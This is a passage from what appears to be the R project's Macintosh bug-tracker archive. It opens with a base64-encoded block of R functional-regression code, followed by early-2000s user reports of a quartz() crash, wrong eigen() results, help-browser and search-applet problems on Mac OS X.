b290dywgIioiKSkAAAQJAAAAFQkJCXptYXRkIDwtIHptYXRzdmQkZAAABAkAAAAaCQkJ
aWYoem1hdGRbem1hdHJua10gPD0gMCkAAAQJAAAACQkJCQlzdG9wKAAABAkAAAAsCQkJ
CSAgIlpNQVQgaXMgbm90IG9mIHNwZWNpZmllZCBjb2x1bW4gcmFuayIAAAQJAAAABwkJ
CQkgICkAAAQJAAAAFQkJCWluZGV4IDwtIDE6em1hdHJuawAABAkAAAAwCQkJemdpbnZ0
IDwtIHN3ZWVwKHptYXRzdmQkdVssIGluZGV4XSwgMSwgem1hdGRbAAAECQAAACoJCQkJ
aW5kZXhdLCAiLyIpICUqJSB0KHptYXRzdmQkdlssIGluZGV4XSkAAAQJAAAAEgkJCWlm
KG52YXIgPT0gMSkgewAABAkAAAAsCQkJCWJjb2VmIDwtIHN3ZWVwKGNvZWYsIDEsIHJv
b3R3LCAiKiIpICUqJSAAAAQJAAAADAkJCQkgIHpnaW52dAAABAkAAAAECQkJfQAABAkA
AAAJCQkJZWxzZSB7AAAECQAAABYJCQkJZm9yKGogaW4gMTpudmFyKSB7AAAECQAAAC0J
CQkJICBiY29lZlssICAsIGpdIDwtIHN3ZWVwKGNvZWZbLCAgLCBqXSwgMSwAAAQJAAAA
HgkJCQkgICAgcm9vdHcsICIqIikgJSolIHpnaW52dAAABAkAAAAFCQkJCX0AAAQJAAAA
BAkJCX0AAAQJAAAAAwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAEgkJCWlmKG52YXIg
PT0gMSkgewAABAkAAAArCQkJCWJjb2VmIDwtIHQobHNmaXQoem1hdCwgdChjb2VmKSwg
d3R2ZWMsIAAABAkAAAAUCQkJCSAgaW50ID0gRikkY29lZikAAAQJAAAABAkJCX0AAAQJ
AAAACQkJCWVsc2UgewAABAkAAAAWCQkJCWZvcihqIGluIDE6bnZhcikgewAABAkAAAAt
CQkJCSAgYmNvZWZbLCAgLCBqXSA8LSB0KGxzZml0KHptYXQsIHQoY29lZlssAAAECQAA
ACQJCQkJICAgICwgal0pLCB3dHZlYywgaW50ID0gRikkY29lZikAAAQJAAAABQkJCQl9
AAAECQAAAAQJCQl9AAAECQAAAAMJCX0AAAQJAAAAHwkJeWhhdGNvZWYgPC0gYmNvZWYg
JSolIHQoem1hdCkAAAQJAAAAEAkJaWYobnZhciA+IDEpIHsAAAQJAAAAMgkJCWRpbW5h
bWVzKGJjb2VmKSA8LSBsaXN0KE5VTEwsIGRpbW5hbWVzKHptYXQpW1syAAAECQAAACAJ
CQkJXV0sIGRpbW5hbWVzKHlmZFtbMV1dKVtbM11dKQAABAkAAAADCQl9AAAECQAAAAgJ
CWVsc2UgewAABAkAAAAyCQkJZGltbmFtZXMoYmNvZWYpIDwtIGxpc3QoTlVMTCwgZGlt
bmFtZXMoem1hdClbWzIAAAQJAAAABwkJCQldXSkAAAQJAAAAAwkJfQAABAkAAAAZCQlm
ZG5hbWVzIDwtIGdldG5hbWVzKGZkKQAABAkAAAAXCQlyZWdmZG5hbWVzIDwtIGZkbmFt
ZXMAAAQJAAAALQkJcmVnZmRuYW1lc1tbMl1dIDwtIHBhc3RlKCJSZWcuIENvZWYuIiwg
MTpwKQAABAkAAAAhCQlyZWdmZG5hbWVzW1szXV0gPC0gIlJlZy4gQ29lZi4iAAAECQAA
AC0JCW5hbWVzKHJlZ2ZkbmFtZXMpWzJdIDwtICJSZWcuIENvZWZmaWNpZW50cyIAAAQJ
AAAAMAkJcmVnZmQgPC0gY3JlYXRlLmZkKGJjb2VmLCBiYXNpc2ZkLCByZWdmZG5hbWVz
KQAABAkAAAAxCQl5aGF0ZmQgPC0gY3JlYXRlLmZkKHloYXRjb2VmLCBiYXNpc2ZkLCBm
ZG5hbWVzKQAABAkAAAAmCQlsaW5tb2RsaXN0IDwtIGxpc3QoMCwgcmVnZmQsIHloYXRm
ZCkAAAQJAAAANAkJbmFtZXMobGlubW9kbGlzdCkgPC0gYygiYWxwaGEiLCAicmVnZmQi
LCAieWhhdGZkIikAAAQJAAAAFAkJcmV0dXJuKGxpbm1vZGxpc3QpAAAECQAAAAIJfQAA
BAkAAABFIyAgKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrAAAECQAAADgjICAgICAgICAgICAgIFRoZSBm
dW5jdGlvbmFsIElWIGFuZCBtdWx0aXZhcmlhdGUgRFYgY2FzZQAABAkAAABFIyAgKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrAAAECQAAAEUjdGhpcyBpcyB0aGUgY2FzZSBvZiBpbnRlcmVzdCAt
IG9idGFpbiB0aGUgQ1YobGFtYmRhKSBzY29yZSBzdGF0aXN0aWMAAAQJAAAAKiNhcyBp
biBzZWN0aW9uIDEwLjggb2YgUmFtc2F5ICAmIFNpbHZlcm1hbgAABAkAAAABIwAABAkA
AAA0CWlmKGluaGVyaXRzKHhmZCwgImZkIikgJiYgIShpbmhlcml0cyh5ZmQsICJmZCIp
KSkgewAABAkAAAAXCQlpZihpcy5udW1lcmljKHlmZCkpIHsAAAQJAAAAGQkJCXltYXQg
PC0gYXMubWF0cml4KHlmZCkAAAQJAAAADAkJCWZkIDwtIHhmZAAABAkAAAADCQl9AAAE
CQAAAAgJCWVsc2UgewAABAkAAAAOCQkJc3RvcChwYXN0ZSgAAAQJAAAAMwkJCQkiU2Vj
b25kIGFyZ3VtZW50IG5vdCBhIGZ1bmN0aW9uYWwgZGF0YSBvYmplY3QiLAAABAkAAAAb
CQkJCSIgYW5kIGlzIG5vdCBudW1lcmljIiwgAAAECQAAACoJCQkJIndoZW4gZmlyc3Qg
YXJndW1lbnQgaXMgZnVuY3Rpb25hbC4iKSkAAAQJAAAAAwkJfQAABAkAAAAVCQljb2Vm
IDwtIGdldGNvZWYoZmQpAAAECQAAABQJCWNvZWZkIDwtIGRpbShjb2VmKQAABAkAAAAX
CQluZGltIDwtIGxlbmd0aChjb2VmZCkAAAQJAAAADgkJaWYobmRpbSA8IDIpAAAECQAA
ADcJCQlzdG9wKCJMaW5lYXIgbW9kZWxpbmcgaW1wb3NzaWJsZSB3aXRoIDEgcmVwbGlj
YXRpb24iAAAECQAAAAUJCQkJKQAABAkAAAAcCQlpZihsZW5ndGgoZGltKGNvZWYpKSA9
PSAzKQAABAkAAABBCQkJc3RvcCgiVGhpcyB2ZXJzaW9uIGNhbm5vdCBhY2NvbW1vZGF0
ZSBtdWx0aXBsZSBmdW5jdGlvbmFsIElWcyIAAAQJAAAABQkJCQkpAAAECQAAABIJCW5y
ZXAgPC0gY29lZmRbMl0AAAQJAAAAFAkJbnZhciA8LSBuY29sKHltYXQpAAAECQAAABkJ
CXJhbmdld3QgPC0gcmFuZ2Uod3R2ZWMpAAAECQAAABQJCWlmKHJhbmdld3RbMV0gPCAw
KQAABAkAAAAyCQkJc3RvcCgiV1RWRUMgbXVzdCBub3QgY29udGFpbiBuZWdhdGl2ZSB2
YWx1ZXMuIikAAAQJAAAAHgkJaWYocmFuZ2V3dFsxXSA9PSByYW5nZXd0WzJdKQAABAkA
AAANCQkJd3R2YXIgPC0gRgAABAkAAAARCQllbHNlIHd0dmFyIDwtIFQAAAQJAAAAGQkJ
YmFzaXNmZCA8LSBnZXRiYXNpcyhmZCkAAAQJAAAAGgkJbmJhc2lzIDwtIGJhc2lzZmQk
bmJhc2lzAAAECQAAAB8JCXR5cGUgPC0gZ2V0YmFzaXN0eXBlKGJhc2lzZmQpAAAECQAA
ABgJCWlmKG5yb3coeW1hdCkgIT0gbnJlcCkAAAQJAAAAQgkJCXN0b3AoIk51bWJlciBv
ZiByb3dzIG9mIFlNQVQgbXVzdCBlcXVhbCBudW1iZXIgb2YgcmVwbGljYXRpb25zIgAA
BAkAAAAFCQkJCSkAAAQJAAAAFQkJb25lIDwtIHJlcCgxLCBucmVwKQAABAkAAAAbCQlp
ZihsZW5ndGgod3R2ZWMpICE9IG5yZXApAAAECQAAACAJCQlzdG9wKCJXVFZFQyBvZiB3
cm9uZyBsZW5ndGgiKQAABAkAAAARCQlpZih4bGFtYmRhIDwgMCkAAAQJAAAAPwkJCXdh
cm5pbmcoIlZhbHVlIG9mIFhMQU1CREEgd2FzIG5lZ2F0aXZlLCBhbmQgMCB1c2VkIGlu
c3RlYWQuIgAABAkAAAAFCQkJCSkAAAQJAAAAIgkJam1hdCA8LSBpbnByb2QoYmFzaXNm
ZCwgYmFzaXNmZCkAAAQJAAAAJgkJem1hdCA8LSB0KHJiaW5kKG9uZSwgam1hdCAlKiUg
Y29lZikpAAAECQAAACIJCWJjb2VmIDwtIG1hdHJpeCgwLCBuYmFzaXMsIG52YXIpAAAE
CQAAABcJCWFscGhhIDwtIHJlcCgwLCBudmFyKQAABAkAAAAZCQlpbmRleCA8LSAyOihu
YmFzaXMgKyAxKQAABAkAAAAgCQlpZih4bGFtYmRhIDw9IDAgJiYgeGVkZiA8IDIpIHsA
AAQJAAAAMyMgIG5vIHNtb290aGluZyByZXF1aXJlZCwgZG8gb3JkaW5hcnkgbGVhc3Qg
c3F1YXJlcwAABAkAAAAqCQkJaWYobmNvbCh6bWF0KSA+IG5yb3coem1hdCkpIHN0b3Ao
cGFzdGUoAAAECQAAADgJCQkJICAiRm9yIFhMQU1CREEgPSAwLCBuby4gb2YgYmFzaXMg
ZnVuY3Rpb25zIGV4Y2VlZHMiLAAABAkAAAAwCQkJCSAgIm51bWJlciBvZiByZXBsaWNh
dGlvbnMuIE5vIGZpdCBwb3NzaWJsZS4iAAAECQAAAAgJCQkJICApKQAABAkAAAADCQl9
AAAECQAAAA0JCWlmKHd0dmFyKSB7AAAECQAAACUJCQl0ZW1wIDwtIHN3ZWVwKHptYXQs
IDIsIHd0dmVjLCAiKiIpAAAECQAAACAJCQlDbWF0IDwtIGNyb3NzcHJvZCh0ZW1wLCB6
bWF0KQAABAkAAAAgCQkJRG1hdCA8LSBjcm9zc3Byb2QodGVtcCwgeW1hdCkAAAQJAAAA
AwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAGgkJCUNtYXQgPC0gY3Jvc3Nwcm9kKHpt
YXQpAAAECQAAACAJCQlEbWF0IDwtIGNyb3NzcHJvZCh6bWF0LCB5bWF0KQAABAkAAAAD
CQl9AAAECQAAACAJCWlmKHhsYW1iZGEgPiAwIHx8IHhlZGYgPj0gMikgewAABAkAAAAV
IyAgc21vb3RoaW5nIHJlcXVpcmVkAAAECQAAACwJCQlrbWF0IDwtIG1hdHJpeCgwLCBu
YmFzaXMgKyAxLCBuYmFzaXMgKyAxKQAABAkAAAAyCQkJa21hdFtpbmRleCwgaW5kZXhd
IDwtIGlucHJvZChiYXNpc2ZkLCBiYXNpc2ZkLCAAAAQJAAAADgkJCXhMZmQsIHhMZmQp
AAAECQAAACAJCQlDbWF0IDwtIENtYXQgKyB4bGFtYmRhICoga21hdAAABAkAAAAAAAAE
CQAAADIJCQlTPC0gem1hdCAlKiUgc29sdmUoQ21hdCkgJSolIHQoem1hdCkjaGF0IG1h
dHJpeAAABAkAAAAiCQlFREYxIDwtIHN1bShkaWFnKFMpKQkjIHRyYWNlIChTKQAABAkA
AAAuCQlFREYyIDwtIHN1bShkaWFnKGNyb3NzcHJvZChTKSkpICN0cmFjZSAoU1MnKQAA
BAkAAAA8CQlFREYzIDwtIHN1bShkaWFnKDIgKiBTIC0gY3Jvc3Nwcm9kKFMpKSkgIyB0
cmFjZSAoMlMgLSBTJ1MpAAAECQAAACgJCXByaW50KCBwYXN0ZShwYXN0ZSgnRURGJywx
OjMsc2VwPScnKSwgAAAECQAAADUJCXJvdW5kKGMoRURGMSxFREYyLEVERjMpLDIpLHNl
cD0nPScsY29sbGFwc2U9JyAgICcpLAAABAkAAAALCQkJcXVvdGU9RikAAAQJAAAAAwkJ
fQAABAkAAAA0CQl0ZW1wIDwtIHN5bXNvbHZlKENtYXQsIERtYXQpCSMgY3NpIGluIGVx
IDEwLjE1IFImUwAABAkAAAACCQkAAAQJAAAAAAAABAkAAAAVI1MgaXMgdGhlIGhhdCBt
YXRyaXggAAAECQAAABsjdXNlIEJ1amEgZXQgYWwuJ3Mgbm90YXRpb24AAAQJAAAAASMA
AAQJAAAAAAAABAkAAAAQCQlTaWkgPC0gZGlhZyhTKQAABAkAAAAYCQl5aGF0IDwtIHpt
YXQgJSolIHRlbXAJAAAECQAAAAIJIwAABAkAAAAqCSN0aGlzIHdpbGwgb25seSB3b3Jr
IGlmIHlmZCBpcyBhIHZlY3RvcjsgAAAECQAAAAIJIwAABAkAAAAnCQlDViA8LSBzdW0o
KCh5ZmQgLSB5aGF0KS8oMSAtIFNpaSkpXjIpAAAECQAAACQJCWJjb2VmIDwtIGFzLm1h
dHJpeCh0ZW1wW2luZGV4LCAgXSkAAAQJAAAAFQkJYWxwaGEgPC0gdGVtcFsxLCAgXQAA
BAkAAAAaCQlmZG5hbWVzIDwtIGdldG5hbWVzKHhmZCkAAAQJAAAAFwkJcmVnZmRuYW1l
cyA8LSBmZG5hbWVzAAAECQAAADAJCXJlZ2ZkbmFtZXNbWzJdXSA8LSBwYXN0ZSgiUmVn
LiBDb2VmLiIsIDE6bnZhcikAAAQJAAAAIQkJcmVnZmRuYW1lc1tbM11dIDwtICJSZWcu
IENvZWYuIgAABAkAAAAtCQluYW1lcyhyZWdmZG5hbWVzKVsyXSA8LSAiUmVnLiBDb2Vm
ZmljaWVudHMiAAAECQAAADAJCXJlZ2ZkIDwtIGNyZWF0ZS5mZChiY29lZiwgYmFzaXNm
ZCwgcmVnZmRuYW1lcykAAAQJAAAAOQkJbGlubW9kbGlzdCA8LSBsaXN0KGFscGhhLCBy
ZWdmZCwgeWhhdCwgQ1YsIEVERjEsIEVERjIsIAAABAkAAAAICQkJRURGMykAAAQJAAAA
OQkJbmFtZXMobGlubW9kbGlzdCkgPC0gYygiYWxwaGEiLCAicmVnZmQiLCAieWhhdCIs
ICJDViIsIAAABAkAAAAaCQkJIkVERjEiLCAiRURGMiIsICJFREYzIikAAAQJAAAAFAkJ
cmV0dXJuKGxpbm1vZGxpc3QpAAAECQAAAAIJfQAABAkAAABFIyAgKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrAAAECQAAADYjICAgICAgICAgICAgIFRoZSBmdW5jdGlvbmFsIElWIGFuZCBmdW5j
dGlvbmFsIERWIGNhc2UAAAQJAAAARSMgICsrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKwAABAkAAAAxCWlm
KGluaGVyaXRzKHhmZCwgImZkIikgJiYgaW5oZXJpdHMoeWZkLCAiZmQiKSkgewAABAkA
AAAXCQljb2VmeCA8LSBnZXRjb2VmKHhmZCkAAAQJAAAAFwkJY29lZnkgPC0gZ2V0Y29l
Zih5ZmQpAAAECQAAABYJCWNvZWZkeCA8LSBkaW0oY29lZngpAAAECQAAABYJCWNvZWZk
eSA8LSBkaW0oY29lZnkpAAAECQAAABkJCW5kaW14IDwtIGxlbmd0aChjb2VmZHgpAAAE
CQAAABkJCW5kaW15IDwtIGxlbmd0aChjb2VmZHkpAAAECQAAAA8JCWlmKG5kaW14IDwg
MikAAAQJAAAANwkJCXN0b3AoIkxpbmVhciBtb2RlbGluZyBpbXBvc3NpYmxlIHdpdGgg
MSByZXBsaWNhdGlvbiIAAAQJAAAABQkJCQkpAAAECQAAABAJCWlmKG5kaW14ID09IDMp
AAAECQAAAEEJCQlzdG9wKCJUaGlzIHZlcnNpb24gY2Fubm90IGFjY29tbW9kYXRlIG11
bHRpcGxlIGZ1bmN0aW9uYWwgSVZzIgAABAkAAAAFCQkJCSkAAAQJAAAAEwkJbnJlcCA8
LSBjb2VmZHhbMl0AAAQJAAAAFwkJaWYoY29lZmR5WzJdICE9IG5yZXApAAAECQAAAEoJ
CQlzdG9wKCJOdW1iZXJzIG9mIG9ic2VydmF0aW9ucyBpbiB0aGUgZmlyc3QgdHdvIGFy
Z3VtZW50cyBkbyBub3QgbWF0Y2guIgAABAkAAAAFCQkJCSkAAAQJAAAAGQkJcmFuZ2V3
dCA8LSByYW5nZSh3dHZlYykAAAQJAAAAFAkJaWYocmFuZ2V3dFsxXSA8IDApAAAECQAA
ADIJCQlzdG9wKCJXVFZFQyBtdXN0IG5vdCBjb250YWluIG5lZ2F0aXZlIHZhbHVlcy4i
KQAABAkAAAAeCQlpZihyYW5nZXd0WzFdID09IHJhbmdld3RbMl0pAAAECQAAAA0JCQl3
dHZhciA8LSBGAAAECQAAABEJCWVsc2Ugd3R2YXIgPC0gVAAABAkAAAAbCQliYXNpc3hm
ZCA8LSBnZXRiYXNpcyh4ZmQpAAAECQAAABwJCW5iYXNpc3ggPC0gYmFzaXN4ZmQkbmJh
c2lzAAAECQAAABgJCXR5cGV4IDwtIGJhc2lzeGZkJHR5cGUAAAQJAAAAHgkJcmFuZ2V2
eCA8LSBiYXNpc3hmZCRyYW5nZXZhbAAABAkAAAAbCQliYXNpc3lmZCA8LSBnZXRiYXNp
cyh5ZmQpAAAECQAAABwJCW5iYXNpc3kgPC0gYmFzaXN5ZmQkbmJhc2lzAAAECQAAABgJ
CXR5cGV5IDwtIGJhc2lzeWZkJHR5cGUAAAQJAAAAHgkJcmFuZ2V2eSA8LSBiYXNpc3lm
ZCRyYW5nZXZhbAAABAkAAAAbCQlpZihsZW5ndGgod3R2ZWMpICE9IG5yZXApAAAECQAA
ACAJCQlzdG9wKCJXVFZFQyBvZiB3cm9uZyBsZW5ndGgiKQAABAkAAAAVCQlpZihtaW4o
d3R2ZWMpIDw9IDApAAAECQAAADAJCQlzdG9wKCJBbGwgdmFsdWVzIG9mIFdUVkVDIG11
c3QgYmUgcG9zaXRpdmUuIikAAAQJAAAAEQkJaWYoeGxhbWJkYSA8IDApAAAECQAAAD4J
CQl3YXJuaW5nKCJWYWx1ZSBvZiBMQU1CREEgd2FzIG5lZ2F0aXZlLCBhbmQgMCB1c2Vk
IGluc3RlYWQuIgAABAkAAAAFCQkJCSkAAAQJAAAAJQkJam1hdHggPC0gaW5wcm9kKGJh
c2lzeGZkLCBiYXNpc3hmZCkAAAQJAAAAMwkJcGVubWF0eCA8LSBpbnByb2QoYmFzaXN4
ZmQsIGJhc2lzeGZkLCB4TGZkLCB4TGZkKQAABAkAAAASCQlpZihuZGlteCA9PSAyKSB7
AAAECQAAADIJCQl6bWF0eCA8LSB0KHJiaW5kKG1hdHJpeCgxLCAxLCBucmVwKSwgam1h
dHggJSolIAAABAkAAAALCQkJCWNvZWZ4KSkAAAQJAAAAAwkJfQAABAkAAAAICQllbHNl
IHsAAAQJAAAAMgkJCXptYXR4IDwtIHQocmJpbmQobWF0cml4KDEsIDEsIG5yZXApLCBq
bWF0eCAlKiUgAAAECQAAABMJCQkJY29lZnhbLCAgLCAxXSkpAAAECQAAAAMJCX0AAAQJ
AAAAJQkJam1hdHkgPC0gaW5wcm9kKGJhc2lzeWZkLCBiYXNpc3lmZCkAAAQJAAAAMwkJ
cGVubWF0eSA8LSBpbnByb2QoYmFzaXN5ZmQsIGJhc2lzeWZkLCB5TGZkLCB5TGZkKQAA
BAkAAAAaCQlhbHBoYSA8LSByZXAoMCwgbmJhc2lzeSkAAAQJAAAAGgkJaW5kZXggPC0g
MjoobmJhc2lzeCArIDEpAAAECQAAAC4JCWttYXR4IDwtIG1hdHJpeCgwLCBuYmFzaXN4
ICsgMSwgbmJhc2lzeCArIDEpAAAECQAAACAJCWttYXR4W2luZGV4LCBpbmRleF0gPC0g
cGVubWF0eAAABAkAAAANCQlpZih3dHZhcikgewAABAkAAAAnCQkJem1hdHcgPC0gc3dl
ZXAoem1hdHgsIDIsIHd0bWF0LCAiKiIpAAAECQAAADUJCQl0ZW1weCA8LSBzb2x2ZShj
cm9zc3Byb2Qoem1hdHcsIHptYXR4KSArIHhsYW1iZGEgKgAABAkAAAAKCQkJCWttYXR4
KQAABAkAAAAsCQkJdGVtcHkgPC0gc29sdmUoam1hdHkgKyB5bGFtYmRhICogcGVubWF0
eSkAAAQJAAAAMwkJCWdtYXQgPC0gdGVtcHggJSolIGNyb3NzcHJvZCh6bWF0dywgdChj
b2VmeVssICAsIAAABAkAAAAcCQkJCTFdKSkgJSolIGptYXR5ICUqJSB0ZW1weQAABAkA
AAADCQl9AAAECQAAAAgJCWVsc2UgewAABAkAAAAvCQkJdGVtcHggPC0gc29sdmUoY3Jv
c3Nwcm9kKHptYXR4KSArIHhsYW1iZGEgKiAAAAQJAAAACgkJCQlrbWF0eCkAAAQJAAAA
LAkJCXRlbXB5IDwtIHNvbHZlKGptYXR5ICsgeWxhbWJkYSAqIHBlbm1hdHkpAAAECQAA
ABMJCQlpZihuZGlteSA9PSAyKSB7AAAECQAAACkJCQkJZ21hdCA8LSB0ZW1weCAlKiUg
Y3Jvc3Nwcm9kKHptYXR4LCB0KAAABAkAAAAhCQkJCSAgY29lZnkpKSAlKiUgam1hdHkg
JSolIHRlbXB5AAAECQAAAAQJCQl9AAAECQAAAAkJCQllbHNlIHsAAAQJAAAAKQkJCQln
bWF0IDwtIHRlbXB4ICUqJSBjcm9zc3Byb2Qoem1hdHgsIHQoAAAECQAAACkJCQkJICBj
b2VmeVssICAsIDFdKSkgJSolIGptYXR5ICUqJSB0ZW1weQAABAkAAAAECQkJfQAABAkA
AAADCQl9AAAECQAAAB8JCXloYXRjb2VmIDwtIHQoem1hdHggJSolIGdtYXQpAAAECQAA
ACYJCWJjb2VmIDwtIG1hdHJpeCgwLCBuYmFzaXN4LCBuYmFzaXN5KQAABAkAAAAZCQli
Y29lZiA8LSBnbWF0W2luZGV4LCAgXQAABAkAAAAgCQlhbHBoYSA8LSBhcy5tYXRyaXgo
Z21hdFsxLCAgXSkAAAQJAAAAGgkJZmRuYW1lcyA8LSBnZXRuYW1lcyh5ZmQpAAAECQAA
ABkJCWFscGhhZmRuYW1lcyA8LSBmZG5hbWVzAAAECQAAACIJCWFscGhhZmRuYW1lc1tb
Ml1dIDwtICJJbnRlcmNlcHQiAAAECQAAACcJCW5hbWVzKGFscGhhZmRuYW1lcylbMl0g

==> 1991.audit <==
Tue Sep 17 11:21:40 2002	maechler	foobar
Tue Sep 17 11:21:40 2002	maechler	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2276 *
Subject: Mac specific - quartz leads to crash
From: h95mr@mun.ca
Date: Fri, 8 Nov 2002 16:28:50 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2276 <==
From h95mr@mun.ca  Fri Nov  8 16:28:51 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA09422
	for <R-bugs@biostat.ku.dk>; Fri, 8 Nov 2002 16:28:50 +0100 (MET)
Date: Fri, 8 Nov 2002 16:28:50 +0100 (MET)
From: h95mr@mun.ca
Message-Id: <200211081528.QAA09422@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Mac specific - quartz leads to crash

Full_Name: Martin Renner
Version: 1.6.0
OS: MacOS X 10.2.1
Submission from: (NULL) (134.153.109.176)


Opening a new graphics device with quartz () produces a quartz window but it
cannot be resized, there's no red close-button and R usually crashes within the
next 20 seconds (unexpectedly quit). Also, I can't copy this window (copy does
not do anything, old clipboard is not replaced). 

Thank you,

Martin

==> 2276.audit <==
Sat Nov  9 10:43:53 2002	ripley	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2550 *
Subject: eigen() error: R Version 1.6.1 on Mac OS X
From: "Daniel E. Weeks" <dweeks@watson.hgen.pitt.edu>
Date: Fri, 14 Feb 2003 15:36:15 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2550 <==
From dweeks@watson.hgen.pitt.edu Fri Feb 14 21:37:02 2003
Received: from mb2i0.ns.pitt.edu (mb2i0.ns.pitt.edu [136.142.186.36])
	by pubhealth.ku.dk (8.12.7/8.12.7) with ESMTP id h1EKb135007461
	for <r-bugs@biostat.ku.dk>; Fri, 14 Feb 2003 21:37:01 +0100 (MET)
Received: from [136.142.114.28] by pitt.edu (PMDF V5.2-32 #41462)
 with ESMTP id <01KSFLSIBTTC005CFU@mb2i0.ns.pitt.edu> for r-bugs@biostat.ku.dk;
 Fri, 14 Feb 2003 15:36:11 EST
Date: Fri, 14 Feb 2003 15:36:15 -0500
From: "Daniel E. Weeks" <dweeks@watson.hgen.pitt.edu>
Subject: eigen() error: R Version 1.6.1 on Mac OS X
To: r-bugs@biostat.ku.dk
Cc: jsw@cdc.noaa.gov
Message-id: <BA72BD6F.4A42%dweeks@watson.hgen.pitt.edu>
MIME-version: 1.0
Content-type: text/plain; charset="US-ASCII"
Content-transfer-encoding: 7bit
User-Agent: Microsoft-Entourage/10.1.1.2418

Consider this matrix:

> sg
     X1    X2    X3    X4    X5
1 3.240 2.592 2.592 2.592 2.592
2 2.592 3.240 2.592 2.592 2.592
3 2.592 2.592 3.240 2.592 2.592
4 2.592 2.592 2.592 3.240 2.592
5 2.592 2.592 2.592 2.592 3.240

If I compute the eigenvalues of the 'sg' matrix using R Version 1.5.0
(2002-04-29) under Linux (or using Version 1.4.0  (2001-12-19) under
Solaris), I obtain:

> eigen(sg)
$values
[1] 13.608  0.648  0.648  0.648  0.648

I also obtain the same eigenvalues under R Version 1.5.1  (2002-06-17) under
Mac OS X 10.2.3.

However, if I compute the eigenvalues of the 'sg' matrix using R Version
1.6.1  (2002-11-01) under Mac OS X 10.2.3, I obtain a different answer:

> eigen(sg)
$values
[1] 13.123930  0.648000  0.648000  0.648000 -1.732930
> det(sg)
[1] 2.399354
> det(sg,method="eigenvalues")
[1] -7.312317


Thanks,
 -- Dan --


==> 2550.audit <==
Fri Feb 21 13:17:34 2003	ripley	foobar
Fri Feb 21 13:17:34 2003	ripley	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2725 *
Subject: Default broswer for OS X
From: james@freelancepropaganda.com
Date: Fri, 4 Apr 2003 06:04:48 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2725 <==
From james@freelancepropaganda.com Fri Apr  4 06:04:49 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3444mpD003411
	for <R-bugs@biostat.ku.dk>; Fri, 4 Apr 2003 06:04:49 +0200 (MET DST)
Date: Fri, 4 Apr 2003 06:04:48 +0200 (MET DST)
Message-Id: <200304040404.h3444mpD003411@pubhealth.ku.dk>
From: james@freelancepropaganda.com
To: R-bugs@biostat.ku.dk
Subject: Default broswer for OS X

Full_Name: James Howison
Version: 1.6.2
OS: OS X (fink install)
Submission from: (NULL) (66.67.80.30)


The default browser for the html help system is not set correctly for OS X.

This makes the html help work great on OS X:

> options(browser = "open")
> help.start()

"open" is an OS X launcher app that inspects a file and launches it with the
appropriate application (it is the same as double clicking).  It launches in the
system preferred browser - which is great - integration with the OS for free :)

Perhaps this could be added to the darwin.hints file (if such a thing is used
for R) or otherwise added in so that it is the default.

The user-experience is definately increased by being able to read the help at
the same time one uses it :)

I've promoted the packager for the OS X fink package to set this as the default
in the build if that is possible.

==> 2725.audit <==
Wed Apr  9 12:57:32 2003	ripley	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2813 *
Subject: Search Engine
From: leroy@ucsd.edu
Date: Tue, 22 Apr 2003 06:21:19 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2813 <==
From leroy@ucsd.edu Tue Apr 22 06:21:19 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3M4LJpD005032
	for <R-bugs@biostat.ku.dk>; Tue, 22 Apr 2003 06:21:19 +0200 (MET DST)
Date: Tue, 22 Apr 2003 06:21:19 +0200 (MET DST)
Message-Id: <200304220421.h3M4LJpD005032@pubhealth.ku.dk>
From: leroy@ucsd.edu
To: R-bugs@biostat.ku.dk
Subject: Search Engine

Full_Name: Anthony Westerling
Version: 1.7.0
OS: Mac OS X 10.2.5
Submission from: (NULL) (64.203.9.4)


R includes a very nice search engine web page which installs at
/usr/local/lib/R/doc/html/search/SearchEngine.html.  The search engine and
keywords links do not work on my Mac G4s running OS X 10.2.5, and this appears
to be independent of choice of browser.  This appears to be a Mac-specific
problem with the Java applet.  

I have tried this on three different G4s using IE, Safari, and Mozilla.  Neither
the local file /usr/local/lib/R/doc/html/search/ nor the latest patched version
documentation at http://stat.ethz.ch/R-alpha/R-patched/doc/html/search/SearchEngine.html
works on the Mac, although the latter URL functions perfectly when accessed from
a browser on a windows PC.

This search function is a very nice feature.  Is there a way to use it on a
Macintosh?

Thank you

Anthony Westerling


==> 2813.audit <==
Sat Apr 26 16:46:51 2003	maechler	foobar
Sat Apr 26 16:46:52 2003	maechler	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2875 *
Subject: configure succeeds without dlfcn.h, but fails to compile (OS X)
From: buerkla@uwec.edu
Date: Tue, 29 Apr 2003 20:24:12 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2875 <==
